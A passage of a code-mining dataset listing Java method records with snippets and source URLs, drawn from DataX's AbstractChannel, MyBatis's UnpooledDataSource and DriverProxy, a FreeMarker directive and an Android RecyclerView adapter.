* @param lastCommunication\n     */\n    protected abstract void updateCounter(Communication currentCommunication, Communication lastCommunication);\n    /**\n     *  the log printed in the first time\n     */\n    protected abstract void firstPrint();\n\n\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55479, "method_name": "statPush", "class_name": "AbstractChannel", "params": ["Communication", "long"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void statPush(Communication currentCommunication, long dataSize);\n\n    /**\n     * stat pull\n     * @param currentCommunication\n     * @param dataSize\n     */\n    protected abstract void statPull(Communication currentCommunication, long dataSize);\n    /**\n     * current domain speed\n     * @return\n     */\n    protected abstract long currentDataSpeed(Communication currentCommunication, Communication lastCommunication, long interval);\n\n    /**\n     * update counter\n     * @param currentCommunication\n     * @param lastCommunication\n     */\n    protected abstract void updateCounter(Communication currentCommunication, Communication lastCommunication);\n    /**\n     *  the log printed in the first time\n     */\n    protected abstract void firstPrint();\n\n\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55480, "method_name": "statPull", "class_name": "AbstractChannel", "params": ["Communication", "long"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void statPull(Communication currentCommunication, long dataSize);\n    /**\n     * current domain speed\n     * @return\n     */\n    protected abstract long currentDataSpeed(Communication currentCommunication, Communication lastCommunication, long interval);\n\n    /**\n     * update counter\n     * @param currentCommunication\n     * @param lastCommunication\n     */\n    protected abstract void updateCounter(Communication currentCommunication, Communication lastCommunication);\n    /**\n     *  the log printed in the first time\n     */\n    protected abstract void firstPrint();\n\n\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55481, "method_name": "currentDataSpeed", "class_name": "AbstractChannel", "params": ["Communication", "Communication", "long"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "long", "snippet": "    protected abstract long currentDataSpeed(Communication currentCommunication, Communication lastCommunication, long interval);\n\n    /**\n     * update counter\n     * @param currentCommunication\n     * @param lastCommunication\n     */\n    protected abstract void updateCounter(Communication currentCommunication, Communication lastCommunication);\n    /**\n     *  the log printed in the first time\n     */\n    protected abstract void firstPrint();\n\n\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55482, "method_name": "updateCounter", "class_name": "AbstractChannel", "params": ["Communication", "Communication"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void updateCounter(Communication currentCommunication, Communication lastCommunication);\n    /**\n     *  the log printed in the first time\n     */\n    protected abstract void firstPrint();\n\n\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55483, "method_name": "firstPrint", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void firstPrint();\n\n\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55484, "method_name": "getConnection", "class_name": "UnpooledDataSource", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Connection", "snippet": "  public Connection getConnection() throws SQLException {\n    return doGetConnection(username, password);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55485, "method_name": "getConnection", "class_name": "UnpooledDataSource", "params": ["String", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Connection", "snippet": "  public Connection getConnection(String username, String password) throws SQLException {\n    return doGetConnection(username, password);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55486, "method_name": "setLoginTimeout", "class_name": "UnpooledDataSource", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLoginTimeout(int loginTimeout) {\n    DriverManager.setLoginTimeout(loginTimeout);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55487, "method_name": "getLoginTimeout", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getLoginTimeout() {\n    return DriverManager.getLoginTimeout();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55488, "method_name": "setLogWriter", "class_name": "UnpooledDataSource", "params": ["PrintWriter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLogWriter(PrintWriter logWriter) {\n    DriverManager.setLogWriter(logWriter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55489, "method_name": "getLogWriter", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PrintWriter", "snippet": "  public PrintWriter getLogWriter() {\n    return DriverManager.getLogWriter();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55490, "method_name": "getDriverClassLoader", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ClassLoader", "snippet": "  public ClassLoader getDriverClassLoader() {\n    return driverClassLoader;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55491, "method_name": "setDriverClassLoader", "class_name": "UnpooledDataSource", "params": ["ClassLoader"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setDriverClassLoader(ClassLoader driverClassLoader) {\n    this.driverClassLoader = driverClassLoader;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55492, "method_name": "getDriverProperties", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Properties", "snippet": "  public Properties getDriverProperties() {\n    return driverProperties;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55493, "method_name": "setDriverProperties", "class_name": "UnpooledDataSource", "params": ["Properties"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setDriverProperties(Properties driverProperties) {\n    this.driverProperties = driverProperties;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55494, "method_name": "getDriver", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "String", "snippet": "  public synchronized String getDriver() {\n    return driver;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55495, "method_name": "setDriver", "class_name": "UnpooledDataSource", "params": ["String"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "  public synchronized void setDriver(String driver) {\n    this.driver = driver;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55496, "method_name": "getUrl", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getUrl() {\n    return url;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55497, "method_name": "setUrl", "class_name": "UnpooledDataSource", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setUrl(String url) {\n    this.url = url;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55498, "method_name": "getUsername", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getUsername() {\n    return username;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55499, "method_name": "setUsername", "class_name": "UnpooledDataSource", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setUsername(String username) {\n    this.username = username;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55500, "method_name": "getPassword", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getPassword() {\n    return password;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55501, "method_name": "setPassword", "class_name": "UnpooledDataSource", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setPassword(String password) {\n    this.password = password;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55502, "method_name": "isAutoCommit", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "  public Boolean isAutoCommit() {\n    return autoCommit;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55503, "method_name": "setAutoCommit", "class_name": "UnpooledDataSource", "params": ["Boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAutoCommit(Boolean autoCommit) {\n    this.autoCommit = autoCommit;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55504, "method_name": "getDefaultTransactionIsolationLevel", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getDefaultTransactionIsolationLevel() {\n    return defaultTransactionIsolationLevel;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55505, "method_name": "setDefaultTransactionIsolationLevel", "class_name": "UnpooledDataSource", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setDefaultTransactionIsolationLevel(Integer defaultTransactionIsolationLevel) {\n    this.defaultTransactionIsolationLevel = defaultTransactionIsolationLevel;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55506, "method_name": "getDefaultNetworkTimeout", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getDefaultNetworkTimeout() {\n    return defaultNetworkTimeout;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55507, "method_name": "setDefaultNetworkTimeout", "class_name": "UnpooledDataSource", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setDefaultNetworkTimeout(Integer defaultNetworkTimeout) {\n    this.defaultNetworkTimeout = defaultNetworkTimeout;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55508, "method_name": "doGetConnection", "class_name": "UnpooledDataSource", "params": ["String", "String"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "Connection", "snippet": "  private Connection doGetConnection(String username, String password) throws SQLException {\n    Properties props = new Properties();\n    if (driverProperties != null) {\n      props.putAll(driverProperties);\n    }\n    if (username != null) {\n      props.setProperty(\"user\", username);\n    }\n    if (password != null) {\n      props.setProperty(\"password\", password);\n    }\n    return doGetConnection(props);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55509, "method_name": "doGetConnection", "class_name": "UnpooledDataSource", "params": ["Properties"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "Connection", "snippet": "  private Connection doGetConnection(Properties properties) throws SQLException {\n    initializeDriver();\n    Connection connection = DriverManager.getConnection(url, properties);\n    configureConnection(connection);\n    return connection;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55510, "method_name": "initializeDriver", "class_name": "UnpooledDataSource", "params": [], "throws": ["SQLException"], "modifiers": ["synchronized", "private"], "return_type": "void", "snippet": "  private synchronized void initializeDriver() throws SQLException {\n    if (!registeredDrivers.containsKey(driver)) {\n      Class<?> driverType;\n      try {\n        if (driverClassLoader != null) {\n          driverType = Class.forName(driver, true, driverClassLoader);\n        } else {\n          driverType = Resources.classForName(driver);\n        }\n        // DriverManager requires the driver to be loaded via the system ClassLoader.\n        // http://www.kfu.com/~nsayer/Java/dyn-jdbc.html\n        Driver driverInstance = (Driver)driverType.getDeclaredConstructor().newInstance();\n        DriverManager.registerDriver(new DriverProxy(driverInstance));\n        registeredDrivers.put(driver, driverInstance);\n      } catch (Exception e) {\n        throw new SQLException(\"Error setting driver on UnpooledDataSource. Cause: \" + e);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55511, "method_name": "configureConnection", "class_name": "UnpooledDataSource", "params": ["Connection"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void configureConnection(Connection conn) throws SQLException {\n    if (defaultNetworkTimeout != null) {\n      conn.setNetworkTimeout(Executors.newSingleThreadExecutor(), defaultNetworkTimeout);\n    }\n    if (autoCommit != null && autoCommit != conn.getAutoCommit()) {\n      conn.setAutoCommit(autoCommit);\n    }\n    if (defaultTransactionIsolationLevel != null) {\n      conn.setTransactionIsolation(defaultTransactionIsolationLevel);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55512, "method_name": "unwrap", "class_name": "UnpooledDataSource", "params": ["Class<T>"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T unwrap(Class<T> iface) throws SQLException {\n    throw new SQLException(getClass().getName() + \" is not a wrapper.\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55513, "method_name": "isWrapperFor", "class_name": "UnpooledDataSource", "params": ["Class<?>"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isWrapperFor(Class<?> iface) throws SQLException {\n    return false;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55514, "method_name": "getParentLogger", "class_name": "UnpooledDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Logger", "snippet": "  public Logger getParentLogger() {\n    // requires JDK version 1.6\n    return Logger.getLogger(Logger.GLOBAL_LOGGER_NAME);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["DataSource"], "modifiers": ["public"]}}, {"id": 55515, "method_name": "acceptsURL", "class_name": "DriverProxy", "params": ["String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean acceptsURL(String u) throws SQLException {\n      return this.driver.acceptsURL(u);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["Driver"], "modifiers": ["static", "private"]}}, {"id": 55516, "method_name": "connect", "class_name": "DriverProxy", "params": ["String", "Properties"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Connection", "snippet": "    public Connection connect(String u, Properties p) throws SQLException {\n      return this.driver.connect(u, p);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["Driver"], "modifiers": ["static", "private"]}}, {"id": 55517, "method_name": "getMajorVersion", "class_name": "DriverProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMajorVersion() {\n      return this.driver.getMajorVersion();\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["Driver"], "modifiers": ["static", "private"]}}, {"id": 55518, "method_name": "getMinorVersion", "class_name": "DriverProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMinorVersion() {\n      return this.driver.getMinorVersion();\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["Driver"], "modifiers": ["static", "private"]}}, {"id": 55519, "method_name": "getPropertyInfo", "class_name": "DriverProxy", "params": ["String", "Properties"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "DriverPropertyInfo", "snippet": "    public DriverPropertyInfo[] getPropertyInfo(String u, Properties p) throws SQLException {\n      return this.driver.getPropertyInfo(u, p);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["Driver"], "modifiers": ["static", "private"]}}, {"id": 55520, "method_name": "jdbcCompliant", "class_name": "DriverProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean jdbcCompliant() {\n      return this.driver.jdbcCompliant();\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["Driver"], "modifiers": ["static", "private"]}}, {"id": 55521, "method_name": "getParentLogger", "class_name": "DriverProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Logger", "snippet": "    public Logger getParentLogger() {\n      return Logger.getLogger(Logger.GLOBAL_LOGGER_NAME);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/datasource/unpooled/UnpooledDataSource.java", "stars": "15", "class_props": {"extends": null, "implements": ["Driver"], "modifiers": ["static", "private"]}}, {"id": 55522, "method_name": "execute", "class_name": "ArticleTagDirective", "params": ["Environment", "Map", "TemplateModel", "TemplateDirectiveBody"], "throws": ["TemplateException", "IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute(Environment env, Map map, TemplateModel[] templateModels, TemplateDirectiveBody body) throws TemplateException, IOException {\n        final DefaultObjectWrapperBuilder builder = new DefaultObjectWrapperBuilder(Configuration.VERSION_2_3_25);\n        String methodName = map.get(BeyondConst.METHOD_KEY).toString();\n        switch (methodName) {\n            case \"archiveYear\":\n                env.setVariable(\"archives\", builder.build().wrap(articleService.listYearArchives()));\n                break;\n            default:\n                break;\n        }\n        body.render(env.getOut());\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/freemarker/ArticleTagDirective.java", "stars": "1", "class_props": {"extends": null, "implements": ["TemplateDirectiveModel"], "modifiers": ["public"]}}, {"id": 55523, "method_name": "getItemId", "class_name": "BaseAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getItemId(int position) {\n        return position;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55524, "method_name": "onBindViewHolder", "class_name": "BaseAdapter", "params": ["VH", "int"], "throws": null, "modifiers": ["final", "public"], "return_type": "void", "snippet": "    public final void onBindViewHolder(@NonNull VH holder, int position) {\n        holder.markViewHolderPosition(position);\n        holder.onBindView(position);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55525, "method_name": "getRecyclerView", "class_name": "BaseAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "RecyclerView", "snippet": "    public RecyclerView getRecyclerView() {\n        return mRecyclerView;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55526, "method_name": "getContext", "class_name": "BaseAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Context", "snippet": "    public Context getContext() {\n        return mContext;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55527, "method_name": "onAttachedToRecyclerView", "class_name": "BaseAdapter", "params": ["RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAttachedToRecyclerView(@NonNull RecyclerView recyclerView) {\n        mRecyclerView = recyclerView;\n        //\u7528\u6237\u8bbe\u7f6e\u4e86\u6eda\u52a8\u76d1\u542c\uff0c\u9700\u8981\u7ed9RecyclerView\u8bbe\u7f6e\u76d1\u542c\n        if (mScrollListener != null) {\n            //\u6dfb\u52a0\u6eda\u52a8\u76d1\u542c\n            mRecyclerView.addOnScrollListener(mScrollListener);\n        }\n        //\u5224\u65ad\u5f53\u524d\u7684\u5e03\u5c40\u7ba1\u7406\u5668\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u8bbe\u7f6e\u9ed8\u8ba4\u7684\u5e03\u5c40\u7ba1\u7406\u5668\n        if (mRecyclerView.getLayoutManager() == null) {\n            RecyclerView.LayoutManager layoutManager = generateDefaultLayoutManager(mContext);\n            if (layoutManager != null) {\n                mRecyclerView.setLayoutManager(layoutManager);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55528, "method_name": "onDetachedFromRecyclerView", "class_name": "BaseAdapter", "params": ["RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDetachedFromRecyclerView(@NonNull RecyclerView recyclerView) {\n        //\u79fb\u9664\u6eda\u52a8\u76d1\u542c\n        if (mScrollListener != null) {\n            mRecyclerView.removeOnScrollListener(mScrollListener);\n        }\n        mRecyclerView = null;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55529, "method_name": "generateDefaultLayoutManager", "class_name": "BaseAdapter", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "RecyclerView", "snippet": "    protected RecyclerView.LayoutManager generateDefaultLayoutManager(Context context) {\n        return new LinearLayoutManager(context);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55530, "method_name": "setOnItemClickListener", "class_name": "BaseAdapter", "params": ["OnItemClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnItemClickListener(OnItemClickListener listener) {\n        checkRecyclerViewState();\n        mItemClickListener = listener;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55531, "method_name": "setOnChildClickListener", "class_name": "BaseAdapter", "params": ["int", "OnChildClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnChildClickListener(@IdRes int id, OnChildClickListener listener) {\n        checkRecyclerViewState();\n        if (mChildClickListeners == null) {\n            mChildClickListeners = new SparseArray<>();\n        }\n        mChildClickListeners.put(id, listener);\n    }", "url": 